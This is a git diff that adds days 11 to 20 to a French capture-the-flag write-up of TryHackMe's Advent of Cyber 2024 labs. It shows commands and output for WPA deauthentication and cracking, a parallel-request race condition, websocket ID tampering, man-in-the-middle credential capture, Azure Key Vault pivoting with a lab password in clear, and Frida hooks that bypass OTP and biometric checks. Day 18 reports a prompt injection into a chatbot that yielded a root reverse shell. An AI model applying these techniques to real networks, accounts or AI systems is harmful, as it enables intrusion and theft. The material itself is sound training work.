@@ -1,12 +1,14 @@
 ---
 title: Advent Of Cyber 2024
-tags: [TryHackMe, Facile, Avent, Défi]
+tags: [TryHackMe, Facile, Avent, Défi, Brouillon]
 style: border
 color: thm
 comments: false
 description: Calendrier de l'avent de la Cyber 2024
 ---
 Lien vers l'épreuve : <https://tryhackme.com/r/room/adventofcyber2024>
+
+>30/12/2024 : Ce compte-rendu est actuellement à l'état de brouillon. A partir du jour 11, la méthodologie n'est pas rédigée.
 
 ![Logo Événement](https://tryhackme-images.s3.amazonaws.com/room-icons/62c435d1f4d84a005f5df811-1728982657816)
 
@@ -24,6 +26,18 @@ Lien vers l'épreuve : <https://tryhackme.com/r/room/adventofcyber2024>
 * [Jour 8 : Shellcodes du monde, rassemblement](#jour-8--shellcodes-du-monde-rassemblement)
 * [Jour 9 : 9 heure, rend le GRC amusant, ne le dis à personne](#jour-9--9-heure-rend-le-grc-amusant-ne-le-dis-à-personne)
 * [Jour 10 : Il a un cerveau rempli de macro, et il a des shells dans son âme](#jour-10--il-a-un-cerveau-rempli-de-macro-et-il-a-des-shells-dans-son-âme)
+* [Jour 11 : Si vous voulez vous connecter avec WPA, appuyez sur la touche étoile](#jour-11--si-vous-voulez-vous-connecter-avec-wpa-appuyez-sur-la-touche-étoile)
+* [Jour 12 : Si je ne peux pas voler leur argent, je volerais leur argent](#jour-12--si-je-ne-peux-pas-voler-leur-argent-je-volerais-leur-argent)
+* [Jour 13 : C'est arrivé sans mémoire tampon ! C'est arrivé sans lag](#jour-13--cest-arrivé-sans-mémoire-tampon--cest-arrivé-sans-lag)
+* [Jour 14 : Même si nous sommes horriblement mal gérés, il n'y aura pas de visage triste durant SOC-mas](#jour-14--même-si-nous-sommes-horriblement-mal-gérés-il-ny-aura-pas-de-visage-triste-durant-soc-mas)
+* [Jour 15 : Aussi odieux soit-il, il n'y a pas d'endroit comme le Contrôleur de Domaine.](#jour-15--aussi-odieux-soit-il-il-ny-a-pas-dendroit-comme-le-contrôleur-de-domaine)
+* [Jour 16 : *The Wareville’s Key Vault grew three sizes that day.*](#jour-16--the-warevilles-key-vault-grew-three-sizes-that-day)
+* [Jour 17 : Il a analysé et analysé jusqu'à ce que l'analyseur soit douloureux](#jour-17--il-a-analysé-et-analysé-jusquà-ce-que-lanalyseur-soit-douloureux)
+* [Jour 18 : Je pourrais utiliser de l'interaction avec l'IA](#jour-18--je-pourrais-utiliser-de-linteraction-avec-lia)
+* [Jour 19 : J'ai juste remarqué que tu étais mal stocké, mon cher secret](#jour-19--jai-juste-remarqué-que-tu-étais-mal-stocké-mon-cher-secret)
+* [Jour 20 : Si tu prononces ne serait-ce qu'un seul paquet](#jour-20--si-tu-prononces-ne-serait-ce-quun-seul-paquet)
+* [Jour 21 : *HELP ME...I'm REVERSE ENGINEERING*](#jour-21--help-meim-reverse-engineering)
+* [Jour 22 : *It's because I'm kubed, isn't it?*](#jour-22--its-because-im-kubed-isnt-it)
 
 ## Jour 1 : Peut-être que la musique de SOC-mas, pensait-il, ne vient pas d'un magasin ?
 
@@ -943,3 +957,842 @@ Mode              Size  Type  Last modified              Name
 meterpreter > cat C:/Users/Administrator/Desktop/flag.txt
 THM{[...expurgé...]}
 ```
+
+## Jour 11 : Si vous voulez vous connecter avec WPA, appuyez sur la touche étoile
+
+![Wi-Fi attacks](https://img.shields.io/badge/Wi--Fi%20attacks-4d354a?logo=tryhackme)
+
+![Jour 11](https://tryhackme-images.s3.amazonaws.com/user-uploads/618b3fa52f0acc0061fb0172/room-content/618b3fa52f0acc0061fb0172-1730305996223.png)
+
+Machine distante : `iw` permet de montrer les dispositifs sans fil
+
+```bash
+iw dev
+phy#2
+	Interface wlan2
+		ifindex 5
+		wdev 0x200000001
+		addr 02:[...expurgé...]:00
+		type managed
+		txpower 20.00 dBm
+```
+
+Mode scanner
+
+```bash
+sudo iw dev wlan2 scan
+BSS 02:[...expurgé...]:00(on wlan2)
+	last seen: 488.100s [boottime]
+	TSF: 1734777765845574 usec (20078d, 10:42:45)
+	freq: 2437
+	beacon interval: 100 TUs
+	capability: ESS Privacy ShortSlotTime (0x0411)
+	signal: -30.00 dBm
+	last seen: 0 ms ago
+	Information elements from Probe Response frame:
+	SSID: M[...expurgé...]P
+	Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 
+	DS Parameter set: channel 6
+	ERP: Barker_Preamble_Mode
+	Extended supported rates: 24.0 36.0 48.0 54.0 
+	RSN:	 * Version: 1
+		 * Group cipher: CCMP
+		 * Pairwise ciphers: CCMP
+		 * Authentication suites: PSK
+		 * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
+	Supported operating classes:
+		 * current operating class: 81
+	Extended capabilities:
+		 * Extended Channel Switching
+		 * Operating Mode Notification
+```
+
+Passage en mode écoute (*monitor*)
+
+```bash
+# Désactiver l'interface
+sudo ip link set dev wlan2 down
+# Passer wlan2 en mode monitor
+sudo iw dev wlan2 set type monitor
+# Réactiver l'interface
+sudo ip link set dev wlan2 up
+# Vérification
+iw dev wlan2 info
+Interface wlan2
+	ifindex 5
+	wdev 0x200000001
+	addr 02:00:00:00:02:00
+	type monitor
+	wiphy 2
+	channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
+	txpower 20.00 dBm
+```
+
+Première instance : capture des paquets ***WPA handshake***
+
+```txt
+sudo airodump-ng -c 6 --bssid 02:[...expurgé...]:00 -w output-file wlan2
+# Mode écoute
+BSSID                  PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+02:[...expurgé...]:00  -28 100      631        8    0   6   54   WPA2 CCMP   PSK  MalwareM_AP  
+
+# Reçu
+BSSID                  STATION                PWR   Rate    Lost    Frames  Notes  Probes
+
+02:[...expurgé...]:00  02:[...expurgé...]:00  -29    0 - 1      0        3 
+```
+
+2ème instance : déconnexion du client
+
+```bash
+sudo aireplay-ng -0 1 -a 02:[...expurgé...]:00 -c 02:[...expurgé...]:00 wlan2
+11:09:02  Waiting for beacon frame (BSSID: 02:00:00:00:00:00) on channel 6
+11:09:02  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:01:00] [ 0| 0 ACKs]
+```
+
+Interception du handshake et forçage du mot de passe
+
+```bash
+sudo aircrack-ng -a 2 -b 02:[...expurgé...]:00 -w /home/glitch/rockyou.txt output*cap
+Reading packets, please wait...
+Opening output-file-04.cap
+Read 273 packets.
+
+1 potential targets
+
+                               Aircrack-ng 1.6 
+
+      [00:00:00] 512/513 keys tested (1161.16 k/s) 
+
+      Time left: 0 seconds                                      99.81%
+
+                        KEY FOUND! [ ...expurgé... ]
+
+
+      Master Key     : 54 42 17 98 25 7C 66 3C 5D 2A A4 C8 0A AC 37 E6 
+                       80 92 EC FE 5E EE C3 AC DB 1D 80 6C 6D 54 D3 5E 
+
+      Transient Key  : 97 01 37 C7 CC 7B 9A C1 BA 1B 59 DA 45 90 59 74 
+                       F2 A7 D2 64 EA 0E BA AA E2 28 41 D6 6D B6 05 B7 
+                       37 02 F0 6A 80 1E 87 91 D8 10 26 5B 90 5D D4 D0 
+                       6A AA 89 62 0A 6F A9 30 CB BD AA 76 12 4B 2B D0 
+
+      EAPOL HMAC     : 2C 1F 19 3C B3 77 DD 9A F6 F5 0C D1 5F 3C D8 E8
+```
+
+## Jour 12 : Si je ne peux pas voler leur argent, je volerais leur argent
+
+![Web timing attacks](https://img.shields.io/badge/Web%20timing%20attacks-4d354a?logo=tryhackme)
+
+![Jour 12](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/62a7685ca6e7ce005d3f3afe-1730353204089.png)
+
+Nous commençons par ouvrir le site a attaqué, et nous arrivons sur une page de connexion.
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-12_login.png" caption="Page de connexion" %}
+
+Puisqu'il s'agit d'un test en boîte grise, nous disposons d'identifiants.
+
+Nous tentons un transfert de 500$ vers le compte suivant (111 puisque nous sommes 110)
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-12_transfert.png" caption="Transfert de 500$ vers le compte 111" %}
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-12_success.png" caption="Les 500$ ont bien été transférés" %}
+
+Via BurpSuite, nous envoyons la requête correspondante vers le *Repeater* afin de vérifier si une protection contre les duplications d'opération existe.
+
+```http
+POST /transfer HTTP/1.1
+Host: 10.10.79.254:5000
+Content-Length: 29
+Cache-Control: max-age=0
+Accept-Language: en-GB,en;q=0.9
+Origin: http://10.10.79.254:5000
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.10.79.254:5000/dashboard
+Accept-Encoding: gzip, deflate, br
+Cookie: session=eyJuYW1lIjoiVGVzdGVyIiwidXNlciI6MTEwfQ.Z2anVg.ggtQGvUR37Zp7fQfFzVL_dec4NI
+Connection: keep-alive
+
+account_number=111&amount=500
+```
+
+Nous envoyons cette attaque en créant un groupe contenant cette même requête dix fois en parallèle.
+
+Lorsque nous rafraîchissons notre tableau de bord, nous contatons que toutes les requêtes ont abouti, et que le solde du compte de test est maintenant -4500$
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-12_tester_balance.png" caption="Les transferts ont tous abouti avec BurpSuite" %}
+
+Nous répétons ces manipulations depuis le compte 101 de Glitch afin de récupérer le flag.
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-12_flag.png" caption="Transfert de plus de 2000$ grâce aux transferts en parallèle pour obtenir le flag" %}
+
+## Jour 13 : C'est arrivé sans mémoire tampon ! C'est arrivé sans lag
+
+![Websockets](https://img.shields.io/badge/Websockets-4d354a?logo=tryhackme)
+
+![Jour 13](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/5fc2847e1bbebc03aa89fbf2-1731326932593.png)
+
+Nous ouvrons BurpSuite et son navigateur pour capturer le trafic des websockets.
+
+Lorsque nous cliquons sur suivre la voiture de Glitch (*Track*), nous interceptons une communication vers le serveur indiquant `42["track",{"userId":"5"}]`. Nous remplaçons la valeur `userId` par 8, et nous cliquons sur *forward* pour envoyer la requête modifiée ainsi que les suivantes jusqu'à obtention de la confirmation que nous suivons la voiture de Mayor Malware.
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-13_tracking.png" caption="Premier flag fourni par Mayor Malware" %}
+
+A présent, nous allons tester la modification du `userId` lors de l'envoi d'un message.
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-13_test.png" caption="Message que nous enverrons pour tester la manipulation" %}
+
+Nous réactivons l'interception du trafic, puis nous envoyons le message ci-dessus. Nous obtenons la communication vers le serveur `42["send_msg",{"txt":"My test message","sender":"5"}]` et nous modifions le numéro de `sender` par la valeur 8 correspondante à Mayor Malware.
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-13_message.png" caption="Le message a bien été envoyé en tant que Mayor Malware et non Glitch" %}
+
+## Jour 14 : Même si nous sommes horriblement mal gérés, il n'y aura pas de visage triste durant SOC-mas
+
+![Certificate mismanagement](https://img.shields.io/badge/Certificate%20mismanagement-4d354a?logo=tryhackme)
+
+![Jour 14](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/5f04259cf9bf5b57aed2c476-1731812568781.svg)
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-14_selfsigned.png" caption="Le certificat est autosigné et n'est pas reconnu par le navigateur" %}
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-14_crt_ca.png" caption="Le certificat est signé par la même organisation que le détenteur du site" %}
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-14_middle.png" caption="On s'insère au milieu du trafic de Wareville" %}
+
+> Le certificat en place étant auto-signé, les utilisateurs sont habitués à "accepter le risque" en se connectant à ce site. Il n'y aura pas de changement dans leur habitude en utilisant le certificat auto-signé de BurpSuite
+
+*Nous lançons ensuite le script de simulation de trafic internet.*
+
+Nous interceptons les identifiants de l'elfe Snowball lors de sa connexion :
+
+```http
+POST /login.php HTTP/1.1
+Host: gift-scheduler.thm
+User-Agent: curl/7.68.0
+Accept: */*
+Content-Length: 40
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+
+username=snowballelf&password=[...expurgé...]
+```
+
+En nous connectant avec ces identifiants, nous pouvons récupérer le premier flag :
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-14_elf_flag.png" caption="Connexion avec les identifiants d'un elfe" %}
+
+Nous observons également les identifiants de Marta Mayware :
+
+```http
+POST /login.php HTTP/1.1
+Host: gift-scheduler.thm
+User-Agent: curl/7.68.0
+Accept: */*
+Content-Length: 49
+Content-Type: application/x-www-form-urlencoded
+Connection: keep-alive
+
+username=marta_mayware&password=[...expurgé...]
+```
+
+Nous accédons ainsi à la page d'administration :
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-14_admin_flag.png" caption="Connexion avec les identifiants d'un administrateur" %}
+
+## Jour 15 : Aussi odieux soit-il, il n'y a pas d'endroit comme le Contrôleur de Domaine.
+
+![Active Directory](https://img.shields.io/badge/Active%20Directory-314267?logo=tryhackme)
+
+![Jour 15](https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/5fc2847e1bbebc03aa89fbf2-1731939602671.png)
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-15_filter.png" caption="Filtre sur les événements 4624 (logon)" %}
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-15_find.png" caption="Recherche du terme 'glitch'" %}
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-15_glitch_logon.png" caption="Informations sur le logon de l'utilisateur Glitch" %}
+
+Nous ouvrons à présent le fichier contenant l'historique PowerShell du compte Administrator.
+
+```powershell
+Get-Content 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt'
+```
+
+```txt
+whoami
+ifconfig
+ipconfig
+ping 1.2.3.4
+ping 1.1.1.1
+#[...expurgé...]
+```
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-15_password.png" caption="Mot de passe de Glitch dans les logs PowerShell" %}
+
+```powershell
+Get-GPO -All | Where-Object { $_.ModificationTime } | Select-Object DisplayName, ModificationTime
+```
+
+```txt
+DisplayName                                ModificationTime
+-----------                                ----------------
+Default Domain Policy                      10/14/2024 12:19:28 PM
+Default Domain Controllers Policy          10/14/2024 12:17:30 PM
+Malicious GPO - [...expurgé...]            10/30/2024 9:01:36 AM
+```
+
+## Jour 16 : *The Wareville’s Key Vault grew three sizes that day.*
+
+![Azure](https://img.shields.io/badge/Azure-4d354a?logo=tryhackme)
+
+![Jour 16](https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1730822609983.png)
+
+Mot de passe dans `officeLocation`
+
+```bash
+az ad user list --filter "startsWith('wvusr-', displayName)"
+[
+[...expurgé pour brièveté...]
+  {
+    "businessPhones": [],
+    "displayName": "wvusr-backupware",
+    "givenName": null,
+    "id": "1db95432-0c46-45b8-b126-b633ae67e06c",
+    "jobTitle": null,
+    "mail": null,
+    "mobilePhone": null,
+    "officeLocation": "R[...expurgé...]s!",
+    "preferredLanguage": null,
+    "surname": null,
+    "userPrincipalName": "wvusr-backupware@aoc2024.onmicrosoft.com"
+  },
+[...expurgé pour brièveté...]
+]
+```
+
+Groupe contenant potentiellement des secrets intéressants
+
+```bash
+az ad group list
+[
+  {
+    "classification": null,
+    "createdDateTime": "2024-10-13T23:10:55Z",
+    "creationOptions": [],
+    "deletedDateTime": null,
+    "description": "Group for recovering Wareville's secrets",
+    "displayName": "Secret Recovery Group",
+    "expirationDateTime": null,
+    "groupTypes": [],
+    "id": "7d96660a[...expurgé...]1762d0cb66b7",
+    [...expurgé pour brièveté...]
+  }
+]
+```
+
+Le compte `wvusr-backupware` fait partie du groupe `Secret Recovery Group`
+
+```bash
+az ad group member list --group "Secret Recovery Group"
+[
+  {
+    "@odata.type": "#microsoft.graph.user",
+    "businessPhones": [],
+    "displayName": "wvusr-backupware",
+    "givenName": null,
+    "id": "1db95432-0c46-45b8-b126-b633ae67e06c",
+    "jobTitle": null,
+    "mail": null,
+    "mobilePhone": null,
+    "officeLocation": "[...expurgé...]",
+    "preferredLanguage": null,
+    "surname": null,
+    "userPrincipalName": "wvusr-backupware@aoc2024.onmicrosoft.com"
+  }
+]
+```
+
+Nous pivotons avec succès sur le compte `wvusr-backupware`
+
+```bash
+az account clear
+Logout successful. Re-login to your initial Cloud Shell identity with 'az login --identity'. Login with a new identity with 'az login'.
+
+az login -u wvusr-backupware@aoc2024.onmicrosoft.com -p R3c0v3r_s3cr3ts!
+Authentication with username and password in the command line is strongly discouraged. Use one of the recommended authentication methods based on your requirements. For more details, see https://go.microsoft.com/fwlink/?linkid=2276314
+Cloud Shell is automatically authenticated under the initial account signed-in with. Run 'az login' only if you need to use a different account
+[
+  {
+    "cloudName": "AzureCloud",
+    "homeTenantId": "1ad8a5d3-b45e-489d-9ef3-b5478392aac0",
+    "id": "ddd3338d-bc5a-416d-8247-1db1f5b5ff43",
+    "isDefault": true,
+    "managedByTenants": [],
+    "name": "Az-Subs-AoC",
+    "state": "Enabled",
+    "tenantDefaultDomain": "aoc2024.onmicrosoft.com",
+    "tenantDisplayName": "AoC 2024",
+    "tenantId": "1ad8a5d3-b45e-489d-9ef3-b5478392aac0",
+    "user": {
+      "name": "wvusr-backupware@aoc2024.onmicrosoft.com",
+      "type": "user"
+    }
+  }
+]
+```
+
+Possibilité de récupérer les clés du *Vault*
+
+```bash
+az role assignment list --assignee 7d96660a-02e1-4112-9515-1762d0cb66b7 --all
+[
+  {
+    [...expurgé pour brièveté...]
+    "roleDefinitionName": "Key Vault Reader",
+    "scope": "/subscriptions/ddd3338d-bc5a-416d-8247-1db1f5b5ff43/resourceGroups/rg-aoc-akv/providers/Microsoft.KeyVault/vaults/warevillesecrets",
+    "type": "Microsoft.Authorization/roleAssignments",
+    "updatedBy": "b470c1dc-9d37-4ce9-b528-4aeaf819781a",
+    "updatedOn": "2024-10-14T20:25:32.172518+00:00"
+  },
+  {
+    [...expurgé pour brièveté...]
+    "roleDefinitionName": "Key Vault Secrets User",
+    "scope": "/subscriptions/ddd3338d-bc5a-416d-8247-1db1f5b5ff43/resourceGroups/rg-aoc-akv/providers/Microsoft.KeyVault/vaults/warevillesecrets",
+    "type": "Microsoft.Authorization/roleAssignments",
+    "updatedBy": "b470c1dc-9d37-4ce9-b528-4aeaf819781a",
+    "updatedOn": "2024-10-14T20:26:53.771014+00:00"
+  }
+]
+```
+
+`wvusr-backupware` a accès au secret `warevillesecrets`
+
+```bash
+az keyvault list
+[
+  {
+    "id": "/subscriptions/ddd3338d-bc5a-416d-8247-1db1f5b5ff43/resourceGroups/rg-aoc-akv/providers/Microsoft.KeyVault/vaults/warevillesecrets",
+    "location": "eastus",
+    "name": "warevillesecrets",
+    "resourceGroup": "rg-aoc-akv",
+    "tags": {},
+    "type": "Microsoft.KeyVault/vaults"
+  }
+]
+```
+
+```bash
+az keyvault secret list --vault-name warevillesecrets
+[
+  {
+    [...expurgé pour brièveté...]
+    "contentType": null,
+    "id": "https://warevillesecrets.vault.azure.net/secrets/[...expurgé...]",
+    "managed": null,
+    "name": "[...expurgé...]",
+    "tags": {}
+  }
+]
+```
+
+```bash
+az keyvault secret show --vault-name warevillesecrets --name [...expurgé...]
+{
+[...expurgé pour brièveté...]
+  "contentType": null,
+  "id": "https://warevillesecrets.vault.azure.net/secrets/[...expurgé...]/7f6bf431a6a94165bbead372bca28ab4",
+  "kid": null,
+  "managed": null,
+  "name": "[...expurgé...]",
+  "tags": {},
+  "value": "W[...expurgé...]9"
+}
+```
+
+## Jour 17 : Il a analysé et analysé jusqu'à ce que l'analyseur soit douloureux
+
+![Log analysis](https://img.shields.io/badge/Log%20analysis-314267?logo=tryhackme)
+
+![Jour 17](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5ed5961c6276df568891c3ea-1731684332887.svg)
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-17_login_successful.png" caption="Nombre de connexions réussies capturées" %}
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-17_DeleteRecording.png" caption="Logs de la suppression d'enregistrements" %}
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-17_ip_address.png" caption="Adresse IP liée à la suppression des enregistrements" %}
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-17_other_session.png" caption="On observe d'autres identifiants de sessions liés à cette adresse IP" %}
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-17_user.png" caption="Nom de l'utilisateur qui a supprimé les enregistrements" %}
+
+## Jour 18 : Je pourrais utiliser de l'interaction avec l'IA
+
+![Prompt injection](https://img.shields.io/badge/Prompt%20injection-4d354a?logo=tryhackme)
+
+![Jour 18](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1732101035669.png)
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-18_test.png" caption="Nous disposons de quelques exemples pour comprendre le fonctionnement" %}
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-18_injection_test.png" caption="Il est possible d'injecter un prompt non prévu" %}
+
+Paquets capturés
+
+```bash
+tcpdump -ni ens5 icmp
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on ens5, link-type EN10MB (Ethernet), capture size 262144 bytes
+21:30:14.340593 IP 10.10.72.125 > 147.185.132.180: ICMP 10.10.72.125 udp port 427 unreachable, length 65
+21:30:34.995910 IP 10.10.176.254 > 10.10.72.125: ICMP echo request, id 1, seq 1, length 64
+21:30:34.996000 IP 10.10.72.125 > 10.10.176.254: ICMP echo reply, id 1, seq 1, length 64
+21:30:36.026910 IP 10.10.176.254 > 10.10.72.125: ICMP echo request, id 1, seq 2, length 64
+21:30:36.026995 IP 10.10.72.125 > 10.10.176.254: ICMP echo reply, id 1, seq 2, length 64
+21:30:37.050873 IP 10.10.176.254 > 10.10.72.125: ICMP echo request, id 1, seq 3, length 64
+21:30:37.050926 IP 10.10.72.125 > 10.10.176.254: ICMP echo reply, id 1, seq 3, length 64
+21:30:38.075010 IP 10.10.176.254 > 10.10.72.125: ICMP echo request, id 1, seq 4, length 64
+21:30:38.075084 IP 10.10.72.125 > 10.10.176.254: ICMP echo reply, id 1, seq 4, length 64
+```
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-18_revshell.png" caption="Injection d'un reverse shell" %}
+
+```bash
+rlwrap nc -lvnp 9000
+Listening on 0.0.0.0 9000
+Connection received on 10.10.176.254 37048
+whoami
+root
+```
+
+{% gist ab3c791e25baa7b437d0324f6d3195af %}
+
+```bash
+find / -iname flag.txt -type f 2>/dev/null
+/home/analyst/flag.txt
+
+cat /home/analyst/flag.txt
+THM{[...expurgé...]}
+```
+
+## Jour 19 : J'ai juste remarqué que tu étais mal stocké, mon cher secret
+
+![Game hacking](https://img.shields.io/badge/Game%20hacking-4d354a?logo=tryhackme)
+
+![Jour 19](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5ed5961c6276df568891c3ea-1732331833645.svg)
+
+[Frida](https://frida.re/)
+
+```bash
+frida-trace ./TryUnlockMe -i 'libaocgame.so!*'
+Instrumenting...                                                        
+[...expurgé pour brièveté...]
+Started tracing 4 functions. Web UI available at http://localhost:1337/ 
+           /* TID 0x7f3 */
+ 73825 ms  _Z7set_otpi()
+```
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-19_set-otp.png" caption="Fonction servant à générer le code OTP" %}
+
+```js
+defineHandler({
+  onEnter(log, args, state) {
+    log('_Z7set_otpi()');
+    log("OTP Code: " + args[0].toInt32());
+  },
+  onLeave(log, retval, state) {
+  }
+});
+```
+
+On relance la discussion avec le pingouin :
+
+```bash
+frida-trace ./TryUnlockMe -i 'libaocgame.so!*'
+Instrumenting...
+[...expurgé pour brièveté...]
+           /* TID 0x7f3 */
+ 73825 ms  _Z7set_otpi()
+707990 ms  _Z7set_otpi() #Après la modification du fichier _Z7set_otpi.js
+707990 ms  OTP Code: 833945 #Récupération d'un code otp
+```
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-19_first_flag.png" caption="Le pingouin nous fourni le premier flag" %}
+
+Second pingouin :
+
+```bash
+frida-trace ./TryUnlockMe -i 'libaocgame.so!*'
+Instrumenting...                                                        
+[...expurgé pour brièveté...]
+           /* TID 0x7f3 */
+ 73825 ms  _Z7set_otpi()
+707990 ms  _Z7set_otpi()
+707990 ms  OTP Code: 833945
+1441061 ms  _Z17validate_purchaseiii() #Nouveau fichier à analyser
+```
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-19_purchase.png" caption="Script gérant l'achat d'items" %}
+
+```js
+defineHandler({
+  onEnter(log, args, state) {
+    log('_Z17validate_purchaseiii()');
+    log('Parameter 1: ' + args[0].toInt32());
+    log('Parameter 2: ' + args[1].toInt32());
+    log('Parameter 3: ' + args[2].toInt32());
+  },
+
+  onLeave(log, retval, state) {
+  }
+});
+```
+
+```bash
+frida-trace ./TryUnlockMe -i 'libaocgame.so!*'
+Instrumenting...                                                        
+[...expurgé pour brièveté...]
+           /* TID 0x7f3 */
+ 73825 ms  _Z7set_otpi()
+707990 ms  _Z7set_otpi()
+707990 ms  OTP Code: 833945
+1441061 ms  _Z17validate_purchaseiii()
+2649372 ms  _Z17validate_purchaseiii() #Nouvelle tentative d'achat
+2649372 ms  Parameter 1: 3 #Choix
+2649372 ms  Parameter 2: 1000000 #Prix
+2649372 ms  Parameter 3: 1 #Argent disponible
+```
+
+```js
+defineHandler({
+  onEnter(log, args, state) {
+    log('_Z17validate_purchaseiii()');
+    args[1] = ptr(0) //Valeur des items forcée à 0
+  },
+
+  onLeave(log, retval, state) {
+  }
+});
+```
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-19_second_flag.png" caption="Deuxième flag" %}
+
+Troisième pingouin
+
+```bash
+frida-trace ./TryUnlockMe -i 'libaocgame.so!*'
+Instrumenting...                                                        
+[...expurgé pour brièveté...]
+           /* TID 0x7f3 */
+ 73825 ms  _Z7set_otpi()
+707990 ms  _Z7set_otpi()
+707990 ms  OTP Code: 833945
+1441061 ms  _Z17validate_purchaseiii()
+2649372 ms  _Z17validate_purchaseiii()
+2649372 ms  Parameter 1: 3
+2649372 ms  Parameter 2: 1000000
+2649372 ms  Parameter 3: 1
+2984000 ms  _Z17validate_purchaseiii()
+3119459 ms  _Z16check_biometricsPKc()
+```
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-19_biometric.png" caption="Script répondant à la validation de la biométrie" %}
+
+```js
+defineHandler({
+  onEnter(log, args, state) {
+    log('_Z16check_biometricsPKc()');
+  },
+
+  onLeave(log, retval, state) {
+    log("The return value is: " + retval); //Afficher la valeur retournée
+  }
+});
+```
+
+```bash
+frida-trace ./TryUnlockMe -i 'libaocgame.so!*'
+Instrumenting...                                                        
+[...expurgé pour brièveté...]
+           /* TID 0x7f3 */
+ 73825 ms  _Z7set_otpi()
+707990 ms  _Z7set_otpi()
+707990 ms  OTP Code: 833945
+1441061 ms  _Z17validate_purchaseiii()
+2649372 ms  _Z17validate_purchaseiii()
+2649372 ms  Parameter 1: 3
+2649372 ms  Parameter 2: 1000000
+2649372 ms  Parameter 3: 1
+2984000 ms  _Z17validate_purchaseiii()
+3119459 ms  _Z16check_biometricsPKc()
+3634020 ms  _Z16check_biometricsPKc()
+3634020 ms  The return value is: 0x0 #Valeur retournée nulle
+```
+
+```js
+defineHandler({
+  onEnter(log, args, state) {
+    log('_Z16check_biometricsPKc()');
+  },
+
+  onLeave(log, retval, state) {
+    retval.replace(ptr(1)); //Forcer la valeur à 1
+  }
+});
+```
+
+{% include elements/figure.html image="images/THM/Advent2024/Capture_ecran_2024-12-19_third_flag.png" caption="Troisième et dernier flag" %}
+
+## Jour 20 : Si tu prononces ne serait-ce qu'un seul paquet
+
+![Traffic analysis](https://img.shields.io/badge/Traffic%20analysis-314267?logo=tryhackme)
+
+![Jour 20](https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/63588b5ef586912c7d03c4f0-1731076103117.png)
+
+Nous suivons le flux du paquet {% include dictionary.html word="HTTP" %} **440** (`POST /initial`)
+
+```http
+POST /initial HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.17763.1490
+Content-Type: text/plain
+Host: [...expurgé...]:8080
+Content-Length: 14
+Connection: Keep-Alive
+
+[...expurgé...]
+HTTP/1.0 200 OK
+Server: BaseHTTP/0.6 Python/3.8.10
+Date: Thu, 17 Oct 2024 09:47:04 GMT
+
+Perfect!
+```
+
